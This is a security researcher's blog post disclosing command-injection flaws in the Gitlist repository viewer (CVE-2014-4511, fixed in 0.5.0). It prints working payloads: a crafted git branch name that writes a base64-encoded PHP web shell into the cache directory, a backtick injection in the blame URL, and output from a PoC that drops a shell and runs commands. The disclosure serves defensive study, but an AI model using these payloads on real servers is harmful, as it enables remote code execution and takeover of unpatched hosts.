				<p><a href="http://gitlist.org/">Gitlist</a> is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy features of it.  I&rsquo;ve got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable <a href="https://github.com/klaussilveira/gitlist/issues/395">hole</a>:</p>
<pre tabindex="0"><code>Oops! sh: 1: Syntax error: EOF in backquote substitution
</code></pre><p>I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I&rsquo;ll document here, including one anonymous remote code execution vulnerability that&rsquo;s quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.</p>
<p>The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:</p>
<pre tabindex="0"><code>$hash = $this-&gt;getClient()-&gt;run($this, &#34;log --pretty=\&#34;%T\&#34; --max-count=1 $branch&#34;);```
</code></pre><p>This can be found in <code>Repository.php</code> of the Gitter library, and is invoked from <code>TreeController.php</code> in Gitlist.  As you can imagine, there is no sanitization on the <code>$branch</code> variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.</p>
<p>The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of <a href="https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c">refs.c</a>, and the rules are simply defined as (starting at line 33):</p>
<ol>
<li>Cannot begin with .</li>
<li>Cannot have a double dot (..)</li>
<li>Cannot contain ASCII control characters (?, [, ], ~, ^, :, \)</li>
<li>End with /</li>
<li>End with .lock</li>
<li>Contain a backslash</li>
<li>Cannot contain a space</li>
</ol>
<p>With these restrictions in mind, we can begin crafting our payload.</p>
<p>My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:</p>
<pre tabindex="0"><code>cd /var/www/gitlist
mkdir cache
chmod 777 cache
</code></pre><p>This is perfect; we have a <em>reliable</em> location with 777 permissions and it&rsquo;s accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:</p>
<pre tabindex="0"><code># git checkout -b &#34;|echo\$IFS\&#34;PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\&#34;|base64\$IFS-d&gt;/var/www/gitlist/cache/x&#34;
</code></pre><p>In order to inject PHP, we need the <!-- raw HTML omitted --> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64&rsquo;d shell into <code>base64</code> for decoding, then pipe that into our payload location.</p>
<p>And it works flawlessly.</p>
<p>Though you might say, &ldquo;Hey if you have commit access it&rsquo;s game over&rdquo;, but I&rsquo;ve seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.</p>
<p>The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:</p>
<pre tabindex="0"><code>$blames = $repository-&gt;getBlame(&#34;$branch -- \&#34;$file\&#34;&#34;);
</code></pre><p>Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:</p>
<pre tabindex="0"><code>http://localhost/gitlist/my_repo.git/blame/master/&#34;&#34;`whoami`
</code></pre><p>And what do you know?</p>
<figure><img src="/images/posts/2014/gitlist_rce1.jpg"/>
</figure>

<p>Curiousity quickly overcame me, and I attempted another vector:</p>
<figure><img src="/images/posts/2014/gitlist_rce2.jpg"/>
</figure>

<p>Faster my fingers flew:</p>
<figure><img src="/images/posts/2014/gitlist_rce3.jpg"/>
</figure>

<p>It&rsquo;s terrifyingly clear that <em>everything</em> is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:</p>
<pre tabindex="0"><code>root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
[!] Using cache location /var/www/gitlist/cache
[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@droot:~/exploits# 
</code></pre><p>I&rsquo;ve also developed a Metasploit module for this issue, which I&rsquo;ll be submitting a PR for soon.  A run of it:</p>
